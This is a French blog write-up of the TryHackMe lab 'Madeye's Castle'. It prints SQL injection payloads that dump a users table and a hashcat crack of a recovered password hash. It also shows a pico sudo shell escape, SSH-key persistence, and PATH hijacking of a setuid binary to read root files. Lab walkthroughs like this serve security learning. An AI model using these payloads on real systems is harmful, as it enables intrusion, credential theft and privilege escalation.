<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        TryHackMe - Madeye&#39;s Castle - Medium ::
        c0nfl1c7 — infosec blog
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="madeyes-castle.thm # Difficulty: Medium OS: Linux Description: A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja Link: https://tryhackme.com/room/madeyescastle Recon # ⌨️ nmap -A madeye.thm
⌨️ dirb http://madeye.thm
En attendant qu’ils se terminent, je me rend sur le site:
Page apache par défaut, rien de vraiment utile, j’ouvre le dev tools pour être sur qu’il n’y a rien d’intréssant dans le code"
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="/post/thm-madeyes/" />







<link rel="stylesheet" href="/css/style.css" />

<link rel="stylesheet" href="/style.css" />


<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png" />
<link rel="shortcut icon" href="/img/favicon.png" />


<link href="/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="TryHackMe - Madeye&#39;s Castle - Medium"/>
<meta name="twitter:description" content="Writeup pour la room &#34;Madeye&#39;s Castle&#34;, une room medium sous linux"/>



<meta property="og:title" content="TryHackMe - Madeye&#39;s Castle - Medium" />
<meta property="og:description" content="Writeup pour la room &#34;Madeye&#39;s Castle&#34;, une room medium sous linux" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/post/thm-madeyes/" /><meta property="article:section" content="post" />
<meta property="article:published_time" content="2022-12-23T00:00:00+00:00" />
<meta property="article:modified_time" content="2022-12-23T00:00:00+00:00" /><meta property="og:site_name" content="c0nfl1c7" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >c0nfl1c7</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/archive">Archive</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/archive">Archive</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <article class="post">
    <h1 class="post-title">TryHackMe - Madeye&rsquo;s Castle - Medium</h1>
    <div class="post-meta">
      
        <time class="post-date">
          23-12-2022
        </time>

        
          
        
      

      
        <span class="post-author"
          >— écrit par conflict</span
        >


      
        <span class="post-read-time"
          >— 6 minute(s) de lecture</span
        >
      
    </div>

    

    

    <div class="post-content">
      
      <h1 id="madeyes-castlethm">
  madeyes-castle.thm
  <a href="#madeyes-castlethm" class="h-anchor" aria-hidden="true">#</a>
</h1>
<ul>
<li>Difficulty: Medium</li>
<li>OS: Linux</li>
<li>Description: <code>A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja</code></li>
<li>Link: <a href="https://tryhackme.com/room/madeyescastle">https://tryhackme.com/room/madeyescastle</a></li>
</ul>
<h1 id="recon">
  Recon
  <a href="#recon" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p><code>⌨️ nmap -A madeye.thm</code></p>
<p><code>⌨️ dirb http://madeye.thm</code></p>
<p>En attendant qu’ils se terminent, je me rend sur le site:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130778-2e336c40-1d08-47b3-ae7c-c6909c5ca3cb.png" alt="2022-12-12-063059_930x1026_scrot"></p>
<p>Page apache par défaut, rien de vraiment utile, j’ouvre le dev tools pour être sur qu’il n’y a rien d’intréssant dans le code</p>
<p>Et je vois ceci dans le HTML:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- TODO: Virtual hosting is good. 
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">TODO: Register for hogwartz-castle.thm --&gt;</span>
</span></span></code></pre></div><p>Je garde ça de côté, mais a priori si j’accède au site depuis <strong>hogwartz-castle.thm</strong>, j’aurai une page différence</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>PORT    STATE SERVICE     VERSION
</span></span><span style="display:flex;"><span>22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
</span></span><span style="display:flex;"><span>|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
</span></span><span style="display:flex;"><span>|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
</span></span><span style="display:flex;"><span>80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.29 (Ubuntu)
</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
</span></span><span style="display:flex;"><span>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
</span></span><span style="display:flex;"><span>445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
</span></span><span style="display:flex;"><span>Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><p>Le scan nmap montre qu’il y a un serveur smb, je vais m’y connecter et voir ce que je peux récupérer dessus</p>
<p><code>⌨️ smbclient -L //madeye.thm/</code></p>
<p>Le seul dossier accessible est le dossier <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>sambashare</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong>, je vais dedans et je récupère les deux fichiers</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130825-a3e8248f-aa3b-4bfd-8fe6-e52cf73ea16f.png" alt="2022-12-12-063626_930x1026_scrot"></p>
<p>Le spellnames.txt est une liste de noms d’utilisateurs, et le notes.txt contient ceci:</p>
<blockquote>
<p>Hagrid told me that spells names are not good since they will not &ldquo;rock you&rdquo;
Hermonine loves historical text editors along with reading old books.</p>
</blockquote>
<p>Je devine assez facilement qu’il veut dire que “rockyou” ne fonctionnera pas, et que donc il ne faut pas essayer de bruteforce le ssh</p>
<p>J’édite mon <strong>/etc/hosts</strong> pour changer le nom de domaine et accéder à l’autre page</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130898-ac1dc1a8-bf67-417b-b27a-3c86ac3cd5be.png" alt="2022-12-12-063959_930x1026_scrot"></p>
<p>Je m’y rends, et je tombe sur ceci:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130917-f1d0f74d-3631-4486-a692-bcbbb1fda96e.png" alt="2022-12-12-064102_930x1026_scrot"></p>
<h1 id="sql-injection">
  SQL Injection
  <a href="#sql-injection" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p>Je tente une injection SQL classique:</p>
<ul>
<li>Username: admin’ or 1=1— -</li>
<li>password: a</li>
</ul>
<p>et le site m’affiche ceci…</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207130935-29238dc9-6842-42e2-af16-cbee59a3ee3c.png" alt="2022-12-12-064226_930x1026_scrot"></p>
<p>Je sais donc qu’il est vulnérable aux injections SQL, mais visiblement on ne peut pas contourner le login avec</p>
<p>Je tente une SQLi UNION BASED, je ne vais pas détailler les étapes pour cause de flemme mais voilà</p>
<p><strong>admin&rsquo; UNION SELECT NULL,NULL,NULL,NULL&ndash; -</strong></p>
<p>→ error&quot;The password for None is incorrect! None&quot;</p>
<p><strong>admin&rsquo; UNION SELECT &ldquo;a&rdquo;,&ldquo;b&rdquo;,&ldquo;c&rdquo;,&ldquo;d&rdquo;&ndash; -</strong></p>
<p>→ error&quot;The password for a is incorrect! d&quot;</p>
<p><strong>admin&rsquo;UNION SELECT NULL,NULL,NULL,sqlite_version()&ndash; -</strong></p>
<p>→ error&quot;The password for None is incorrect! 3.22.0&quot;</p>
<p><strong>admin&rsquo;UNION SELECT NULL,NULL,NULL,sql FROM sqlite_master&ndash; -</strong></p>
<p>→ error&quot;The password for None is incorrect! CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)&quot;</p>
<p>J’ai les colonnes de la table users:</p>
<p><strong>name, password, admin, notes</strong></p>
<p>Je vais dump <strong><strong><strong><strong><strong><strong><strong><strong>password</strong></strong></strong></strong></strong></strong></strong></strong> et <strong><strong><strong><strong><strong>notes</strong></strong></strong></strong></strong></p>
<p><strong>admin&rsquo;UNION SELECT group_concat(notes,&quot; &ndash; &ldquo;),NULL,NULL,NULL FROM users &ndash; -</strong></p>
<p>Toutes les notes sont similaires sauf la deuxième, qui donne un indice sur le nom d’utilisateur et le mot de passe</p>
<pre tabindex="0"><code>💡 My linux username is my first name, and password uses best64
</code></pre><p>En récupérant la liste des utilisateurs avec la même commande (remplace “notes” par “name”), je vois que le deuxième utilisateur est Harry</p>
<p>Je récupère son mot de passe (toujours le même payload, mais on remplace “notes” par “password”), puis j’utilise hashid pour savoir de quel type de hash il s’agit</p>
<p><code>⌨️ hashid b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] SHA<span style="color:#f92672">-</span><span style="color:#ae81ff">512</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Whirlpool 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Salsa10 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Salsa20 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] SHA3<span style="color:#f92672">-</span><span style="color:#ae81ff">512</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Skein<span style="color:#f92672">-</span><span style="color:#ae81ff">512</span> 
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Skein<span style="color:#f92672">-</span><span style="color:#ae81ff">1024</span>(<span style="color:#ae81ff">512</span>)
</span></span></code></pre></div><p>C’est donc à priori du SHA-512, je lance donc hashcat en mode SHA-512, <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>avec la rule best64</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>⌨️ hashcat -m 1700 password.hash -r /usr/share/hashcat/rules/best64.rule /home/conflict/wordlists/rockyou.txt</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
</span></span></code></pre></div><p>J’ai donc le mot de passe de <strong>harry</strong></p>
<p>Je me connecte au ssh avec ce mot de passe</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131371-97507cfb-d204-4300-bff4-01cfbff5923c.png" alt="2022-12-12-192655_1888x1032_scrot"></p>
<h1 id="privesc">
  Privesc
  <a href="#privesc" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p><code>⌨️ sudo -l</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> harry on hogwartz<span style="color:#f92672">-</span>castle:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>local<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>sbin\:<span style="color:#f92672">/</span>bin\:<span style="color:#f92672">/</span>snap<span style="color:#f92672">/</span>bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User harry may run the following commands on hogwartz<span style="color:#f92672">-</span>castle:
</span></span><span style="display:flex;"><span>    (hermonine) <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>pico
</span></span><span style="display:flex;"><span>    (hermonine) <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>pico
</span></span></code></pre></div><p>Je vois que je peux donc utiliser le binaire <strong><strong><strong><strong>pico</strong></strong></strong></strong> en tant que <strong><strong><strong><strong><strong><strong><strong><strong><strong>hermonine</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p>→ <a href="https://gtfobins.github.io/gtfobins/pico/">GTFObins</a></p>
<p>J’utilise ce payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>sudo <span style="color:#f92672">-</span>u hermonine pico
</span></span><span style="display:flex;"><span><span style="color:#f92672">^</span>R<span style="color:#f92672">^</span>X
</span></span><span style="display:flex;"><span>reset; sh <span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">0</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">&gt;&amp;</span><span style="color:#ae81ff">0</span>
</span></span></code></pre></div><p><img src="https://user-images.githubusercontent.com/77807503/207131441-1ff199bd-8aab-45a9-b0af-dc0efe7d3a2a.png" alt="2022-12-12-193417_1888x1032_scrot"></p>
<p>Le shell n’est pas stable du tout, donc j’ajoute ma clé ssh dans <strong><strong><strong><strong><strong><strong><strong>~/.ssh/authorized_keys</strong></strong></strong></strong></strong></strong></strong></p>
<p>Puis je me connecte en ssh au compte <strong><strong><strong><strong><strong><strong><strong><strong><strong>hermonine</strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131645-84b41c3d-75d4-437e-abb4-8b60a4fe633f.png" alt="2022-12-12-193613_1920x1080_scrot"></p>
<p>Puisque je n’ai pas le password de hermonine, je ne peux pas utiliser <strong><strong><strong><strong><strong><strong><strong>sudo -l</strong></strong></strong></strong></strong></strong></strong>, je liste donc les fichiers ayant le <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>setuid bit</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></p>
<p><code>⌨️ find / -user root -perm -4000 -exec ls -ldb {} \; &gt;/tmp/filename</code></p>
<p><code>⌨️ cat /tmp/filename</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">8816</span> Nov <span style="color:#ae81ff">26</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>srv<span style="color:#f92672">/</span>time<span style="color:#f92672">-</span>turner<span style="color:#f92672">/</span>swagger
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">149080</span> Sep <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>sudo
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">22520</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>pkexec
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44528</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chsh
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">76496</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>chfn
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">37136</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newuidmap
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">18448</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>traceroute6<span style="color:#f92672">.</span>iputils
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">37136</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newgidmap
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">59640</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>passwd
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">75824</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>gpasswd
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">40344</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>newgrp
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">100760</span> Nov <span style="color:#ae81ff">23</span>  <span style="color:#ae81ff">2018</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>x86_64<span style="color:#f92672">-</span>linux<span style="color:#f92672">-</span>gnu<span style="color:#f92672">/</span>lxc<span style="color:#f92672">/</span>lxc<span style="color:#f92672">-</span>user<span style="color:#f92672">-</span>nic
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">14328</span> Mar <span style="color:#ae81ff">27</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>policykit<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>polkit<span style="color:#f92672">-</span>agent<span style="color:#f92672">-</span>helper<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">--</span> <span style="color:#ae81ff">1</span> root messagebus <span style="color:#ae81ff">42992</span> Jun <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span><span style="color:#ae81ff">1.0</span><span style="color:#f92672">/</span>dbus<span style="color:#f92672">-</span>daemon<span style="color:#f92672">-</span>launch<span style="color:#f92672">-</span>helper
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">10232</span> Mar <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2017</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>eject<span style="color:#f92672">/</span>dmcrypt<span style="color:#f92672">-</span>get<span style="color:#f92672">-</span>device
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">113528</span> Oct  <span style="color:#ae81ff">8</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>snapd<span style="color:#f92672">/</span>snap<span style="color:#f92672">-</span>confine
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">436552</span> Mar  <span style="color:#ae81ff">4</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>lib<span style="color:#f92672">/</span>openssh<span style="color:#f92672">/</span>ssh<span style="color:#f92672">-</span>keysign
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">26696</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>umount
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">30800</span> Aug <span style="color:#ae81ff">11</span>  <span style="color:#ae81ff">2016</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>fusermount
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">44664</span> Mar <span style="color:#ae81ff">22</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>su
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">64424</span> Jun <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2019</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>ping
</span></span><span style="display:flex;"><span><span style="color:#f92672">-</span>rwsr<span style="color:#f92672">-</span>xr<span style="color:#f92672">-</span>x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">43088</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> <span style="color:#f92672">/</span>bin<span style="color:#f92672">/</span>mount
</span></span></code></pre></div><p>Le seul fichier qui sort du lot est le <strong>/srv/time-turner/swagger</strong></p>
<p>Il s’agit d’un programme type “guess my number”, très classique mais surtout très facile à bypass</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131690-3db21737-74f7-42f4-8533-63d046fff34b.png" alt="2022-12-12-194803_1888x1032_scrot"></p>
<p>Pour avoir le bon nombre, j’utilise ce petit payload:</p>
<p><code>⌨️ echo 1 | ./swagger | tr -dc ‘0-9’ | ./swagger</code></p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131709-0111da88-5d39-463f-9f2e-6c6af3f0646e.png" alt="2022-12-12-194924_1888x1032_scrot"></p>
<p>Le tr -dc permet de ne récupérer que les chiffres, or, puisqu’il nous donne le chiffre “qu’il avait choisi”, on peut directement lui redonner et le chiffre n’aura pas changé puisque les 4 commandes sont faites en parallèle</p>
<p>Je vois qu’il me donne l’architecture système…pas utile</p>
<p>Par contre on peut supposer qu’il fait appel à la commande <strong><strong><strong><strong><strong>uname</strong></strong></strong></strong></strong></p>
<p>Je part donc sur une path hijacking, je crée un <strong><strong><strong><strong><strong>uname</strong></strong></strong></strong></strong> dans <strong><strong><strong><strong><strong>/tmp/</strong></strong></strong></strong></strong>, puis je lui donne tout les permissions et je met à jour le <strong><strong><strong><strong>PATH</strong></strong></strong></strong></p>
<p><code>⌨️ echo &quot;cat /root/root.txt&quot; &gt; /tmp/uname</code></p>
<p><code>⌨️ chmod +x /tmp/uname</code></p>
<p><code>⌨️ export PATH=/tmp:$PATH</code></p>
<p>Maintenant, plus qu’à réutiliser le payload pour qu’il fasse appel au <strong><strong><strong><strong><strong>uname</strong></strong></strong></strong></strong>, et normalement le <strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong><strong>root.txt</strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong></strong> devrait être lu</p>
<p><img src="https://user-images.githubusercontent.com/77807503/207131741-2b37d8b6-cbca-4cf4-982d-2da93ebdb9e1.png" alt="2022-12-12-195317_1888x1032_scrot"></p>
<p>gg!</p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >voir d&#39;autres posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="/post/thm-dogcat/">
                  <span class="button__icon">←</span>
                  <span class="button__text">TryHackMe - dogcat - Medium</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="/post/nahamcon2022/">
                  <span class="button__text">NahamCon CTF 2022 - Writeup</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </article>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
